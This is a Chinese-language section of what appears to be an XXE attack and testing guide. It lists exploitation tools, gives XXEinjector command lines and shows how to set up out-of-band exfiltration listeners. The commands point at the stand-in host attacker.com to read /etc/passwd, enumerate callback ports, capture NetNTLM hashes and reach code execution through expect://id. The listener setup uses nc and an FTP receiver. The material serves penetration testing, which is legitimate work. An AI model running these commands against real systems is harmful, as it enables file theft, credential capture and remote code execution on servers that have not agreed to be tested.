## 十三、工具链

### 13.1 探测与利用工具
| 工具 | 用途 |
|------|------|
| Burp Suite Pro（2025.2+ Burp AI）| 主动扫描 + OAST 自动链 + AI 辅助 triage |
| XXEinjector | 自动化 OOB（--oob=http/ftp/gopher）、--phpfilter、--netdoc、--enumports、--hashes、--expect、--upload、--xslt |
| XXExploiter | 可视化 OOB/CDATA/错误盲提取一键生成 |
| dtd-finder（GoSecure）| 本地 DTD 扫描 + 无出网错误盲提取 payload 生成 |
| oxml_xxe / XXElixir | OOXML（docx/xlsx/pptx）恶意文档注入 |
| Gopherus | 配合 XXE 生成 gopher 协议内网攻击 payload |
| Docem / xxeserv / XXEServe | OOB 外带平台（HTTP/FTP）|
| Interactsh / Burp Collaborator | DNS/HTTP 外带（OOB 首推）|
| Canarytokens | 文件上传 XXE 快速验证（canarytokens.org）|
| Responder | NetNTLMv2 哈希捕获（Windows 目标）|
| Semgrep（java-xxe/python-xxe 规则）| 静态扫描 XML 解析代码 |
| https://xxe.sh/ | 在线 DTD 托管（测试环境用）|
| payloadbox/xxe-injection-payload-list | payload 字典 |

### 13.2 XXEinjector 实战命令
```bash
# 基础 OOB（FTP 通道读文件）
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd --oob=ftp
# HTTP 外带（Java <1.7 可目录枚举）
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc --oob=http
# PHP base64 编码读取
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd --phpfilter
# 端口枚举（找可用外带回连端口）
ruby XXEinjector.rb --host=attacker.com --file=request.txt --enumports=21,80,443,53
# Windows 哈希捕获
ruby XXEinjector.rb --host=attacker.com --file=request.txt --hashes
# PHP expect RCE
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=expect://id --oob=http
# Java jar schema 上传文件
ruby XXEinjector.rb --host=attacker.com --file=request.txt --upload=/tmp/upload.txt
# XSLT 注入测试
ruby XXEinjector.rb --host=attacker.com --file=request.txt --xslt
# 有回显直接提取
ruby XXEinjector.rb --host=attacker.com --file=request.txt --path=/etc/passwd --direct=UNIQUE_START,UNIQUE_END
```

### 13.3 OOB 外带服务器快速搭建
```bash
# HTTP 记录（最简单）
python3 -m http.server 80
# 或一键交互 OOB：interactsh-client -v（自带随机域名，D 盾后仍是外带首选）
# DNS 监听
nc -lvup 53
# FTP 外带接收
python3 xxeserv.py -p 2121
# Burp Collaborator / interactsh-web 用于正式测试
```

